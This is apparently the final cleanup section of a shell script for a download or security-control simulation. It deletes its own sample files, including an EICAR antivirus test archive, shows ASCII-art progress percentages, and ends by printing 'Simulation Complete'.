rm sample-data.pdf 2> /dev/null
rm sample-data.csv 2> /dev/null
rm 1-MB-Test.xlsx 2> /dev/null
echo "Cleaning up temp files........"
echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▐░▌   ▐░▌
▐░▌       ▐░▌▐░▌            ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄      ▐░▌  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌   ▐░▌    
          ▐░▌▐░▌       ▐░▌  ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▐░▌   ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        
                                    
"
sleep 0.5
clear
echo "Cleaning up temp files........."
rm 10-MB-Test.xlsx 2> /dev/null
rm 1-MB-Test.docx 2> /dev/null
echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▐░▌   ▐░▌
▐░▌       ▐░▌         ▐░▌   ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌        ▐░▌       ▐░▌  
▐░░░░░░░░░░░▌       ▐░▌       ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌      ▐░▌       ▐░▌    
          ▐░▌     ▐░▌       ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌    ▐░▌       ▐░▌   ▐░▌
▐░░░░░░░░░░░▌   ▐░▌       ▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀     ▀         ▀        
                                    
"
sleep 0.5
clear
echo "Cleaning up temp files.........."
rm 10-MB-Test.docx 2> /dev/null
rm file-sample_1MB.docx 2> /dev/null
rm eicar_com.zip 2> /dev/null
echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▐░▌   ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌  ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌  
▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌     ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌   ▐░▌    
          ▐░▌▐░▌       ▐░▌  ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▐░▌   ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        
                                    
"
sleep 0.5
clear
echo "Cleaning up temp files..........."
echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▐░▌   ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌  ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌   ▐░▌    
          ▐░▌          ▐░▌  ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▐░▌   ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        
                                    
"
sleep 0.5
clear
rm tempfile.tmp 2> /dev/null
rm curlurls.txt 2> /dev/null
printf '\033[0m'
echo "
    ▄▄▄▄       ▄▄▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄▄▄           ▄
  ▄█░░░░▌     ▐░░░░░░░░░▌  ▐░░░░░░░░░▌   ▄     ▐░
 ▐░░▌▐░░▌    ▐░█░█▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌ ▐░▌   ▐░▌
  ▀▀ ▐░░▌    ▐░▌▐░▌    ▐░▌▐░▌▐░▌    ▐░▌  ▀   ▐░▌ 
     ▐░░▌    ▐░▌ ▐░▌   ▐░▌▐░▌ ▐░▌   ▐░▌     ▐░▌  
     ▐░░▌    ▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌    ▐░▌   
     ▐░░▌    ▐░▌   ▐░▌ ▐░▌▐░▌   ▐░▌ ▐░▌   ▐░▌    
     ▐░░▌    ▐░▌    ▐░▌▐░▌▐░▌    ▐░▌▐░▌  ▐░▌   ▄ 
 ▄▄▄▄█░░█▄▄▄ ▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄█░█░▌ ▐░▌   ▐░▌
▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌  ▐░░░░░░░░░▌ ▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀   ▀        
"
echo "Temporary Files have been purged."
sleep 2.0
echo "
╔╦╗┬ ┬┌─┐┌┐┌┬┌─┌─┐  ┌─┐┌─┐┬─┐  ┌─┐┬  ┌─┐┬ ┬┬┌┐┌┌─┐    
 ║ ├─┤├─┤│││├┴┐└─┐  ├┤ │ │├┬┘  ├─┘│  ├─┤└┬┘│││││ ┬    
 ╩ ┴ ┴┴ ┴┘└┘┴ ┴└─┘  └  └─┘┴└─  ┴  ┴─┘┴ ┴ ┴ ┴┘└┘└─┘oooo
"
echo " "
echo " "
printf '\033[0;31m'
echo "





╔═╗┌─┐┌─┐┬─┐┬  ┬ ┬  ╔═╗┌─┐┬─┐┬┌─┐┌┬┐┌─┐┌┬┐  ╔╗ ┬ ┬   
╠═╝│ ││ │├┬┘│  └┬┘  ╚═╗│  ├┬┘│├─┘ │ ├┤  ││  ╠╩╗└┬┘   
╩  └─┘└─┘┴└─┴─┘ ┴   ╚═╝└─┘┴└─┴┴   ┴ └─┘─┴┘  ╚═╝ ┴ ooo

 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄               ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌             ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌      ▐░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌             ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌     ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌ ▐░▌   ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░▌       ▐░▌▐░▌   ▐░▌ ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌             ▐░▌     ▐░▌  ▐░▌       ▐░▌▐░▌    ▐░▌▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌             ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄█░▌▐░▌     ▐░▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌             ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌      ▐░░▌
 ▀         ▀  ▀         ▀               ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀ 
                                                                              

                                                                              "
read -n 1 -s -r -p "Simulation Complete...Press any key to exit"
printf '\033[0m'
clear
exit 0